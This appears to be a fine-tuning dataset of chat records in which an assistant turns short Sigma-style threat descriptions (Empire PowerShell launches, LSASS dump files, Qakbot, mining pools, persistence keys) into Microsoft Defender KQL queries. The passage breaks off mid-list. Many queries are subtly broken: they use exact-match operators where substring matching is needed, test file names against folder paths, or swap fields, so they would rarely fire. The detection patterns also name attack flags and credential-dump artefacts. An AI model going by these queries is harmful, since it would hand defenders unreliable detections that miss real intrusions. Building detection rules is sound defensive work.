{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential exploitation attempt of undocumented Windows Server Pre Auth Remote Code Execution (RCE) Topic: proc_creation_win_exploit_other_win_server_undocumented_rce"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessAccountName in~ (\"NETWORK SERVICE\", \"NETZWERKDIENST\", \"SERVIZIO DI RETE\", \"SERVICIO DE RED\")) and InitiatingProcessCommandLine =~ \"-k DHCPServer\" and InitiatingProcessFileName =~ \"\\\\svchost.exe\" and ProcessCommandLine =~ \"-k DHCPServer\" and InitiatingProcessFolderPath =~ \"\\\\svchost.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the enabling of the PowerShell script execution policy. Once enabled, this policy allows scripts to be executed. Topic: registry_set_powershell_enablescripts_enabled"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Policies\\\\Microsoft\\\\Windows\\\\PowerShell\\\\EnableScripts\" and RegistryValueData =~ \"DWORD (0x00000001)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of suspicious files and folders inside the users AppData folder but not inside any of the common and well known directories (Local, Romaing, LocalLow). This method could be used as a method to bypass detection who exclude the AppData folder in fear of FPs Topic: file_event_win_new_files_in_uncommon_appdata_folder"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\".bat\", \".cmd\", \".cpl\", \".dll\", \".exe\", \".hta\", \".iso\", \".lnk\", \".msi\", \".ps1\", \".psm1\", \".scr\", \".vbe\", \".vbs\")) and (not((FileName in~ (\"\\\\AppData\\\\Local\\\\\", \"\\\\AppData\\\\LocalLow\\\\\", \"\\\\AppData\\\\Roaming\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Windows shells and scripting applications that write files to suspicious folders Topic: file_event_win_shell_write_susp_directory"}, {"role": "assistant", "content": "DeviceFileEvents\n| where ((FileName in~ (\"C:\\\\PerfLogs\\\\\", \"C:\\\\Users\\\\Public\\\\\")) and (InitiatingProcessFolderPath in~ (\"\\\\bash.exe\", \"\\\\cmd.exe\", \"\\\\cscript.exe\", \"\\\\msbuild.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\sh.exe\", \"\\\\wscript.exe\"))) or ((FileName in~ (\"C:\\\\PerfLogs\\\\\", \"C:\\\\Users\\\\Public\\\\\", \"C:\\\\Windows\\\\Temp\\\\\")) and (InitiatingProcessFolderPath in~ (\"\\\\certutil.exe\", \"\\\\forfiles.exe\", \"\\\\mshta.exe\", \"\\\\schtasks.exe\", \"\\\\scriptrunner.exe\", \"\\\\wmic.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious powershell command line parameters used in Empire Topic: proc_creation_win_hktl_empire_powershell_launch"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\" -NoP -sta -NonI -W Hidden -Enc \", \" -noP -sta -w 1 -enc \", \" -NoP -NonI -W Hidden -enc \", \" -noP -sta -w 1 -enc\", \" -enc  SQB\", \" -nop -exec bypass -EncodedCommand \")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects rundll32 execution where the DLL is located on a remote location (share) Topic: proc_creation_win_rundll32_unc_path"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" \\\\\\\\\" and (FolderPath endswith \"\\\\rundll32.exe\" or ProcessVersionInfoOriginalFileName =~ \"RUNDLL32.EXE\" or ProcessCommandLine contains \"rundll32\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the PowerShell command lines with special characters Topic: proc_creation_win_powershell_cmdline_special_characters"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\"))) and (ProcessCommandLine matches regex \"\\\\+.*\\\\+.*\\\\+.*\\\\+.*\\\\+.*\\\\+.*\\\\+.*\\\\+.*\\\\+.*\\\\+.*\\\\+.*\\\\+.*\\\\+.*\\\\+\" or ProcessCommandLine matches regex \"\\\\{.*\\\\{.*\\\\{.*\\\\{.*\\\\{.*\\\\{.*\\\\{.*\\\\{.*\\\\{.*\\\\{\" or ProcessCommandLine matches regex \"\\\\^.*\\\\^.*\\\\^.*\\\\^.*\\\\^\" or ProcessCommandLine matches regex \"`.*`.*`.*`.*`\")) and (not((InitiatingProcessFileName =~ \"C:\\\\Program Files\\\\Amazon\\\\SSM\\\\ssm-document-worker.exe\" or (ProcessCommandLine in~ (\"new EventSource(\\\"Microsoft.Windows.Sense.Client.Management\\\"\", \"public static extern bool InstallELAMCertificateInfo(SafeFileHandle handle);\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects direct modification of autostart extensibility point (ASEP) in registry using reg.exe. Topic: proc_creation_win_reg_direct_asep_registry_keys_modification"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \"add\" and InitiatingProcessFolderPath =~ \"\\\\reg.exe\") and (ProcessCommandLine in~ (\"\\\\software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", \"\\\\software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Userinit\", \"\\\\software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Shell\", \"\\\\software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows\", \"\\\\software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\User Shell Folders\", \"\\\\system\\\\CurrentControlSet\\\\Control\\\\SafeBoot\\\\AlternateShell\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation of files with names used by different memory dumping tools to create a memory dump of the LSASS process memory, which contains user credentials. Topic: file_event_win_lsass_default_dump_file_names"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\"\\\\Andrew.dmp\", \"\\\\Coredump.dmp\", \"\\\\lsass.dmp\", \"\\\\lsass.rar\", \"\\\\lsass.zip\", \"\\\\NotLSASS.zip\", \"\\\\PPLBlade.dmp\", \"\\\\rustive.dmp\")) or (FileName in~ (\"\\\\lsass_2\", \"\\\\lsassdmp\", \"\\\\lsassdump\")) or (FileName in~ (\"\\\\lsass\", \".dmp\")) or FileName =~ \"SQLDmpr\" or (FileName in~ (\"\\\\nanodump\", \"\\\\proc_\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect indirect command execution via Program Compatibility Assistant pcwrun.exe Topic: proc_creation_win_lolbin_pcwrun"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\pcwrun.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects modification of autostart extensibility point (ASEP) in registry. Topic: registry_set_asep_reg_keys_modification_currentversion"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey contains \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\" and (RegistryKey contains \"\\\\ShellServiceObjectDelayLoad\" or RegistryKey endswith \"\\\\Run*\" or RegistryKey endswith \"\\\\RunOnce*\" or RegistryKey endswith \"\\\\RunOnceEx*\" or RegistryKey endswith \"\\\\RunServices*\" or RegistryKey endswith \"\\\\RunServicesOnce*\" or RegistryKey contains \"\\\\Policies\\\\System\\\\Shell\" or RegistryKey contains \"\\\\Policies\\\\Explorer\\\\Run\" or RegistryKey contains \"\\\\Group Policy\\\\Scripts\\\\Startup\" or RegistryKey contains \"\\\\Group Policy\\\\Scripts\\\\Shutdown\" or RegistryKey contains \"\\\\Group Policy\\\\Scripts\\\\Logon\" or RegistryKey contains \"\\\\Group Policy\\\\Scripts\\\\Logoff\" or RegistryKey contains \"\\\\Explorer\\\\ShellServiceObjects\" or RegistryKey contains \"\\\\Explorer\\\\ShellIconOverlayIdentifiers\" or RegistryKey contains \"\\\\Explorer\\\\ShellExecuteHooks\" or RegistryKey contains \"\\\\Explorer\\\\SharedTaskScheduler\" or RegistryKey contains \"\\\\Explorer\\\\Browser Helper Objects\" or RegistryKey contains \"\\\\Authentication\\\\PLAP Providers\" or RegistryKey contains \"\\\\Authentication\\\\Credential Providers\" or RegistryKey contains \"\\\\Authentication\\\\Credential Provider Filters\")) and (not((((RegistryValueData in~ (\"\\\"C:\\\\Program Files\\\\AVG\\\\Antivirus\\\\AvLaunch.exe\\\" /gui\", \"\\\"C:\\\\Program Files (x86)\\\\AVG\\\\Antivirus\\\\AvLaunch.exe\\\" /gui\", \"{472083B0-C522-11CF-8763-00608CC02F24}\")) and InitiatingProcessFolderPath =~ \"C:\\\\Program Files\\\\AVG\\\\Antivirus\\\\Setup\\\\\") or (RegistryValueData =~ \"(Empty)\" or RegistryKey endswith \"\\\\NgcFirst\\\\ConsecutiveSwitchCount\" or (InitiatingProcessFolderPath endswith \"\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\Update\\\\OneDriveSetup.exe\" or InitiatingProcessFolderPath endswith \"\\\\AppData\\\\Roaming\\\\Spotify\\\\Spotify.exe\" or InitiatingProcessFolderPath endswith \"\\\\AppData\\\\Local\\\\WebEx\\\\WebexHost.exe\") or (InitiatingProcessFolderPath in~ (\"C:\\\\WINDOWS\\\\system32\\\\devicecensus.exe\", \"C:\\\\Windows\\\\system32\\\\winsat.exe\", \"C:\\\\Program Files\\\\Microsoft OneDrive\\\\StandaloneUpdater\\\\OneDriveSetup.exe\", \"C:\\\\Program Files\\\\Microsoft OneDrive\\\\Update\\\\OneDriveSetup.exe\", \"C:\\\\Program Files (x86)\\\\Microsoft OneDrive\\\\Update\\\\OneDriveSetup.exe\", \"C:\\\\Program Files\\\\KeePass Password Safe 2\\\\ShInstUtil.exe\", \"C:\\\\Program Files\\\\Everything\\\\Everything.exe\", \"C:\\\\Program Files (x86)\\\\Microsoft Office\\\\root\\\\integration\\\\integrator.exe\"))) or (RegistryValueData =~ \"C:\\\\Program Files\\\\Aurora-Agent\\\\tools\\\\aurora-dashboard.exe\" and (InitiatingProcessFolderPath in~ (\"\\\\aurora-agent-64.exe\", \"\\\\aurora-agent.exe\")) and RegistryKey endswith \"\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\aurora-dashboard\") or (RegistryValueData =~ \"ctfmon.exe /n\" and InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\system32\\\\userinit.exe\") or InitiatingProcessFolderPath =~ \"C:\\\\Program Files\\\\Windows Defender\\\\MsMpEng.exe\" or (RegistryValueData endswith \"A251-47B7-93E1-CDD82E34AF8B}\" and InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\system32\\\\regsvr32.exe\" and RegistryKey contains \"DropboxExt\") or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files (x86)\\\\Microsoft\\\\EdgeUpdate\\\\Install\\\\\", \"C:\\\\Program Files (x86)\\\\Microsoft\\\\EdgeWebView\\\\\", \"C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\")) or (RegistryValueData endswith \"\\\\Everything\\\\Everything.exe\\\" -startup\" and RegistryKey endswith \"\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Everything\") or (RegistryValueData contains \"\\\\GoogleDriveFS.exe\" and RegistryValueData startswith \"C:\\\\Program Files\\\\Google\\\\Drive File Stream\\\\\" and RegistryKey endswith \"\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\GoogleDriveFS\") or ((RegistryValueData in~ (\"{CFE8B367-77A7-41D7-9C90-75D16D7DC6B6}\", \"{A8E52322-8734-481D-A7E2-27B309EF8D56}\", \"{C973DA94-CBDF-4E77-81D1-E5B794FBD146}\", \"{51EF1569-67EE-4AD6-9646-E726C3FFC8A2}\")) and RegistryKey contains \"GoogleDrive\") or (RegistryValueData =~ \"C:\\\\Program Files\\\\Greenshot\\\\Greenshot.exe\" and RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Greenshot\") or (RegistryValueData =~ \"\\\"C:\\\\Program Files\\\\iTunes\\\\iTunesHelper.exe\\\"\" and RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\iTunesHelper\") or (InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\system32\\\\LogonUI.exe\" and (RegistryKey endswith \"\\\\Authentication\\\\Credential Providers\\\\{D6886603-9D2F-4EB2-B667-1971041FA96B}*\" or RegistryKey endswith \"\\\\Authentication\\\\Credential Providers\\\\{BEC09223-B018-416D-A0AC-523971B639F5}*\" or RegistryKey endswith \"\\\\Authentication\\\\Credential Providers\\\\{8AF662BF-65A0-4D0A-A540-A338A999D36F}*\" or RegistryKey endswith \"\\\\Authentication\\\\Credential Providers\\\\{27FBDB57-B613-4AF2-9D7E-4FA7A66C21AD}*\")) or InitiatingProcessFolderPath =~ \"\\\\OfficeClickToRun.exe\" or (RegistryValueData contains \"\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\\" and (RegistryValueData startswith \"C:\\\\Windows\\\\system32\\\\cmd.exe /q /c rmdir /s /q \\\"C:\\\\Users\\\\\" or RegistryValueData startswith \"C:\\\\Windows\\\\system32\\\\cmd.exe /q /c del /q \\\"C:\\\\Users\\\\\")) or (RegistryValueData =~ \"C:\\\\Program Files\\\\Opera\\\\assistant\\\\browser_assistant.exe\" and RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Opera Browser Assistant\") or ((RegistryValueData contains \"\\\\AppData\\\\Local\\\\Package Cache\\\\{\" and RegistryValueData contains \"}\\\\python-\") and RegistryValueData endswith \".exe\\\" /burn.runonce\" and RegistryKey contains \"\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\\\{\") or (RegistryValueData contains \"\\\\Microsoft\\\\Teams\\\\Update.exe --processStart \" and InitiatingProcessFolderPath =~ \"\\\\Microsoft\\\\Teams\\\\current\\\\Teams.exe\") or (RegistryValueData =~ \"\\\"C:\\\\Program Files\\\\Zoom\\\\bin\\\\installer.exe\\\" /repair\" and RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\\\zoommsirepair\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Obfuscated Powershell via use Clip.exe in Scripts Topic: proc_creation_win_hktl_invoke_obfuscation_via_use_clip"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine matches regex \"(?i)echo.*clip.*&&.*(Clipboard|i`?n`?v`?o`?k`?e`?)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when an attacker modifies the registry key \"HtmlHelp Author\" to achieve persistence Topic: registry_set_persistence_chm"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\Software\\\\Microsoft\\\\HtmlHelp Author\\\\Location\" or RegistryKey contains \"\\\\Software\\\\WOW6432Node\\\\Microsoft\\\\HtmlHelp Author\\\\Location\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Log4J Wstomcat process execution as seen in Mint Sandstorm activity Topic: proc_creation_win_apt_mint_sandstorm_log4j_wstomcat_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\ws_tomcatservice.exe\" and (not(InitiatingProcessFolderPath =~ \"\\\\repadmin.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "The OpenWith.exe executes other binary Topic: proc_creation_win_lolbin_openwith"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"/c\" and InitiatingProcessFolderPath =~ \"\\\\OpenWith.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "This rule detects execution of a PowerShell code through the sqlps.exe utility, which is included in the standard set of utilities supplied with the MSSQL Server.\nScript blocks are not logged in this case, so this utility helps to bypass protection mechanisms based on the analysis of these logs.\n Topic: proc_creation_win_mssql_sqlps_susp_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\sqlps.exe\" or ((FolderPath endswith \"\\\\sqlps.exe\" or ProcessVersionInfoOriginalFileName =~ \"sqlps.exe\") and (not(InitiatingProcessFileName =~ \"\\\\sqlagent.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Adversaries may disable security tools to avoid possible detection of their tools and activities by removing Windows Defender Definition Files Topic: proc_creation_win_mpcmdrun_remove_windows_defender_definition"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" -RemoveDefinitions\", \" -All\")) and (FolderPath endswith \"\\\\MpCmdRun.exe\" or ProcessVersionInfoOriginalFileName =~ \"MpCmdRun.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects file indicators as seen used by UNC4841 during their Barracuda ESG zero day exploitation. Topic: file_event_lnx_apt_unc4841_file_indicators"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\"/11111.tar\", \"/aacore.sh\", \"/appcheck.sh\", \"/autoins\", \"/BarracudaMailService\", \"/etc/cron.daily/core_check.sh\", \"/etc/cron.daily/core.sh\", \"/etc/cron.hourly/aacore.sh\", \"/etc/cron.hourly/appcheck.sh\", \"/etc/cron.hourly/core.sh\", \"/get_fs_info.pl\", \"/imgdata.jpg\", \"/install_att_v2.tar\", \"/install_bvp74_auth.tar\", \"/install_helo.tar\", \"/install_reuse.tar\", \"/intent_helo\", \"/intent_reuse\", \"/intentbas\", \"/mknod\", \"/mod_attachment.lua\", \"/mod_content.lua\", \"/mod_require_helo.lua\", \"/mod_rtf\", \"/mod_sender.lua\", \"/mod_udp.so\", \"/nfsd_stub.ko\", \"/resize_reisertab\", \"/resize_risertab\", \"/resize2fstab\", \"/rverify\", \"/saslautchd\", \"/sendscd\", \"/snapshot.tar\", \"/tmp/p\", \"/tmp/p7\", \"/tmp/t\", \"/update_v2.sh\", \"/update_v31.sh\", \"/update_v35.sh\", \"/update_version\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects default install commands of the Triple Cross eBPF rootkit based on the \"deployer.sh\" script Topic: proc_creation_lnx_triple_cross_rootkit_install"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" qdisc \", \" filter \")) and InitiatingProcessFolderPath =~ \"/sudo\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects specific process tree behavior of a \"rundll32\" execution with exports linked with Qakbot activity. Topic: proc_creation_win_malware_qakbot_rundll32_exports"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine endswith \"aslr\" or ProcessCommandLine endswith \"bind\" or ProcessCommandLine endswith \"DrawThemeIcon\" or ProcessCommandLine endswith \"GG10\" or ProcessCommandLine endswith \"GL70\" or ProcessCommandLine endswith \"jhbvygftr\" or ProcessCommandLine endswith \"kjhbhkjvydrt\" or ProcessCommandLine endswith \"LS88\" or ProcessCommandLine endswith \"Motd\" or ProcessCommandLine endswith \"N115\" or ProcessCommandLine endswith \"next\" or ProcessCommandLine endswith \"Nikn\" or ProcessCommandLine endswith \"print\" or ProcessCommandLine endswith \"qqqb\" or ProcessCommandLine endswith \"qqqq\" or ProcessCommandLine endswith \"RS32\" or ProcessCommandLine endswith \"Test\" or ProcessCommandLine endswith \"Time\" or ProcessCommandLine endswith \"Updt\" or ProcessCommandLine endswith \"vips\" or ProcessCommandLine endswith \"Wind\" or ProcessCommandLine endswith \"WW50\" or ProcessCommandLine endswith \"X555\" or ProcessCommandLine endswith \"XL55\" or ProcessCommandLine endswith \"xlAutoOpen\" or ProcessCommandLine endswith \"XS88\") and ((InitiatingProcessFileName in~ (\"\\\\cmd.exe\", \"\\\\cscript.exe\", \"\\\\curl.exe\", \"\\\\mshta.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\wscript.exe\")) and (ProcessCommandLine in~ (\":\\\\ProgramData\\\\\", \":\\\\Users\\\\Public\\\\\", \"\\\\AppData\\\\Local\\\\Temp\\\\\", \"\\\\AppData\\\\Roaming\\\\\")) and InitiatingProcessFolderPath =~ \"\\\\rundll32.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects renamed SysInternals tool execution with a binary named ps.exe as used by Dragonfly APT group and documented in TA17-293A report Topic: proc_creation_win_apt_ta17_293a_ps"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"ps.exe -accepteula\", \"-s cmd /c netstat\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects specific process characteristics of Winnti malware noticed in Dec/Jan 2020 in a campaign against Honk Kong universities Topic: proc_creation_win_apt_winnti_mal_hk_jan20"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessFileName in~ (\"C:\\\\Windows\\\\Temp\", \"\\\\hpqhvind.exe\")) and InitiatingProcessFolderPath =~ \"C:\\\\ProgramData\\\\DRM\") or (InitiatingProcessFileName =~ \"C:\\\\ProgramData\\\\DRM\" and InitiatingProcessFolderPath =~ \"\\\\wmplayer.exe\") or (InitiatingProcessFileName =~ \"\\\\Test.exe\" and InitiatingProcessFolderPath =~ \"\\\\wmplayer.exe\") or FolderPath =~ \"C:\\\\ProgramData\\\\DRM\\\\CLR\\\\CLR.exe\" or (InitiatingProcessFileName =~ \"C:\\\\ProgramData\\\\DRM\\\\Windows\" and InitiatingProcessFolderPath =~ \"\\\\SearchFilterHost.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects initiated network connections to crypto mining pools Topic: net_connection_win_domain_crypto_mining_pools"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where RemoteUrl in~ (\"alimabi.cn\", \"ap.luckpool.net\", \"bcn.pool.minergate.com\", \"bcn.vip.pool.minergate.com\", \"bohemianpool.com\", \"ca-aipg.miningocean.org\", \"ca-dynex.miningocean.org\", \"ca-neurai.miningocean.org\", \"ca-qrl.miningocean.org\", \"ca-upx.miningocean.org\", \"ca-zephyr.miningocean.org\", \"ca.minexmr.com\", \"ca.monero.herominers.com\", \"cbd.monerpool.org\", \"cbdv2.monerpool.org\", \"cryptmonero.com\", \"crypto-pool.fr\", \"crypto-pool.info\", \"cryptonight-hub.miningpoolhub.com\", \"d1pool.ddns.net\", \"d5pool.us\", \"daili01.monerpool.org\", \"de-aipg.miningocean.org\", \"de-dynex.miningocean.org\", \"de-zephyr.miningocean.org\", \"de.minexmr.com\", \"dl.nbminer.com\", \"donate.graef.in\", \"donate.ssl.xmrig.com\", \"donate.v2.xmrig.com\", \"donate.xmrig.com\", \"donate2.graef.in\", \"drill.moneroworld.com\", \"dwarfpool.com\", \"emercoin.com\", \"emercoin.net\", \"emergate.net\", \"ethereumpool.co\", \"eu.luckpool.net\", \"eu.minerpool.pw\", \"fcn-xmr.pool.minergate.com\", \"fee.xmrig.com\", \"fr-aipg.miningocean.org\", \"fr-dynex.miningocean.org\", \"fr-neurai.miningocean.org\", \"fr-qrl.miningocean.org\", \"fr-upx.miningocean.org\", \"fr-zephyr.miningocean.org\", \"fr.minexmr.com\", \"hellominer.com\", \"herominers.com\", \"hk-aipg.miningocean.org\", \"hk-dynex.miningocean.org\", \"hk-neurai.miningocean.org\", \"hk-qrl.miningocean.org\", \"hk-upx.miningocean.org\", \"hk-zephyr.miningocean.org\", \"huadong1-aeon.ppxxmr.com\", \"iwanttoearn.money\", \"jw-js1.ppxxmr.com\", \"koto-pool.work\", \"lhr.nbminer.com\", \"lhr3.nbminer.com\", \"linux.monerpool.org\", \"lokiturtle.herominers.com\", \"luckpool.net\", \"masari.miner.rocks\", \"mine.c3pool.com\", \"mine.moneropool.com\", \"mine.ppxxmr.com\", \"mine.zpool.ca\", \"mine1.ppxxmr.com\", \"minemonero.gq\", \"miner.ppxxmr.com\", \"miner.rocks\", \"minercircle.com\", \"minergate.com\", \"minerpool.pw\", \"minerrocks.com\", \"miners.pro\", \"minerxmr.ru\", \"minexmr.cn\", \"minexmr.com\", \"mining-help.ru\", \"miningpoolhub.com\", \"mixpools.org\", \"moner.monerpool.org\", \"moner1min.monerpool.org\", \"monero-master.crypto-pool.fr\", \"monero.crypto-pool.fr\", \"monero.hashvault.pro\", \"monero.herominers.com\", \"monero.lindon-pool.win\", \"monero.miners.pro\", \"monero.riefly.id\", \"monero.us.to\", \"monerocean.stream\", \"monerogb.com\", \"monerohash.com\", \"moneroocean.stream\", \"moneropool.com\", \"moneropool.nl\", \"monerorx.com\", \"monerpool.org\", \"moriaxmr.com\", \"mro.pool.minergate.com\", \"multipool.us\", \"myxmr.pw\", \"na.luckpool.net\", \"nanopool.org\", \"nbminer.com\", \"node3.luckpool.net\", \"noobxmr.com\", \"pangolinminer.comgandalph3000.com\", \"pool.4i7i.com\", \"pool.armornetwork.org\", \"pool.cortins.tk\", \"pool.gntl.co.uk\", \"pool.hashvault.pro\", \"pool.minergate.com\", \"pool.minexmr.com\", \"pool.monero.hashvault.pro\", \"pool.ppxxmr.com\", \"pool.somec.cc\", \"pool.support\", \"pool.supportxmr.com\", \"pool.usa-138.com\", \"pool.xmr.pt\", \"pool.xmrfast.com\", \"pool2.armornetwork.org\", \"poolchange.ppxxmr.com\", \"pooldd.com\", \"poolmining.org\", \"poolto.be\", \"ppxvip1.ppxxmr.com\", \"ppxxmr.com\", \"prohash.net\", \"r.twotouchauthentication.online\", \"randomx.xmrig.com\", \"ratchetmining.com\", \"seed.emercoin.com\", \"seed.emercoin.net\", \"seed.emergate.net\", \"seed1.joulecoin.org\", \"seed2.joulecoin.org\", \"seed3.joulecoin.org\", \"seed4.joulecoin.org\", \"seed5.joulecoin.org\", \"seed6.joulecoin.org\", \"seed7.joulecoin.org\", \"seed8.joulecoin.org\", \"sg-aipg.miningocean.org\", \"sg-dynex.miningocean.org\", \"sg-neurai.miningocean.org\", \"sg-qrl.miningocean.org\", \"sg-upx.miningocean.org\", \"sg-zephyr.miningocean.org\", \"sg.minexmr.com\", \"sheepman.mine.bz\", \"siamining.com\", \"sumokoin.minerrocks.com\", \"supportxmr.com\", \"suprnova.cc\", \"teracycle.net\", \"trtl.cnpool.cc\", \"trtl.pool.mine2gether.com\", \"turtle.miner.rocks\", \"us-aipg.miningocean.org\", \"us-dynex.miningocean.org\", \"us-neurai.miningocean.org\", \"us-west.minexmr.com\", \"us-zephyr.miningocean.org\", \"usxmrpool.com\", \"viaxmr.com\", \"webservicepag.webhop.net\", \"xiazai.monerpool.org\", \"xiazai1.monerpool.org\", \"xmc.pool.minergate.com\", \"xmo.pool.minergate.com\", \"xmr-asia1.nanopool.org\", \"xmr-au1.nanopool.org\", \"xmr-eu1.nanopool.org\", \"xmr-eu2.nanopool.org\", \"xmr-jp1.nanopool.org\", \"xmr-us-east1.nanopool.org\", \"xmr-us-west1.nanopool.org\", \"xmr-us.suprnova.cc\", \"xmr-usa.dwarfpool.com\", \"xmr.2miners.com\", \"xmr.5b6b7b.ru\", \"xmr.alimabi.cn\", \"xmr.bohemianpool.com\", \"xmr.crypto-pool.fr\", \"xmr.crypto-pool.info\", \"xmr.f2pool.com\", \"xmr.hashcity.org\", \"xmr.hex7e4.ru\", \"xmr.ip28.net\", \"xmr.monerpool.org\", \"xmr.mypool.online\", \"xmr.nanopool.org\", \"xmr.pool.gntl.co.uk\", \"xmr.pool.minergate.com\", \"xmr.poolto.be\", \"xmr.ppxxmr.com\", \"xmr.prohash.net\", \"xmr.simka.pw\", 